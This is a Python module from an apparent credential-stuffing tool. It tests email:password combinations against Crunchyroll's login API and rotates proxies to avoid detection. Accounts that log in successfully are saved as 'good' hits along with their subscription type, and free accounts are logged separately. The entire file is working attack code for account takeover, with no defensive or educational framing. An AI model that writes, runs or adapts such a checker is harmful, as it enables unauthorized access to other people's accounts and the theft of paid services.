from modules.variables import Checker
from requests import Session
from modules.functions import log,save,set_proxy,bad_proxy, return_proxy
from requests.adapters import HTTPAdapter, Retry
from uuid import uuid4
import functools

def check(email:str,password:str):
    while not Checker.stopping:
        try:
            with Session() as s:
                proxy = set_proxy()
                proxy_set = set_proxy(proxy)

                s.request = functools.partial(s.request, timeout=Checker.timeout)
                s.proxies.update(proxy_set)
                retries = Retry(total=Checker.retries, backoff_factor=0.1)
                s.mount('http://', HTTPAdapter(max_retries=retries))
                s.mount('https://', HTTPAdapter(max_retries=retries))

                guid = str(uuid4)
                header = {
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
                    "Content-Type":"application/x-www-form-urlencoded",
                    "Accept-Language":"en-US"
                }
                payload = f"device_type=com.crunchyroll.windows.desktop&device_id={guid}&access_token=LNDJgOit5yaRIWN"
                r = s.post("https://api.crunchyroll.com/start_session.0.json",headers=header,data=payload)
                session_id = r.json()['data']['session_id']

                payload = {'account':email,'password':password,'session_id':session_id,'locale':'enUS','version':'1.3.1.0','connectivity_type':'ethernet'}
                r = s.post("https://api.crunchyroll.com/login.0.json",headers=header,data=payload)
                if any(key in r.text for key in ['You forgot to put in your password.','Incorrect login information.']):
                    Checker.bad += 1
                    return_proxy(proxy)
                    return
                elif '"premium":""' in r.text:
                    if not Checker.cui: log("custom",":".join([email,password]),"Crunchyroll")
                    save("Crunchyroll","custom",Checker.time,":".join([email,password]))
                    Checker.custom += 1
                    return_proxy(proxy)
                    return
                elif '"user_id"' not in r.text:
                    raise
                
                subscription = r.json()["data"]["user"]["access_type"]
                if not Checker.cui: log("good",":".join([email,password]),"Crunchyroll")
                save("Crunchyroll","good",Checker.time,":".join([email,password])+f" | Subscription: {subscription}")
                Checker.good += 1
                return_proxy(proxy)
                return
        except:
            bad_proxy(proxy)
            return_proxy(proxy)
            Checker.errors += 1
        
        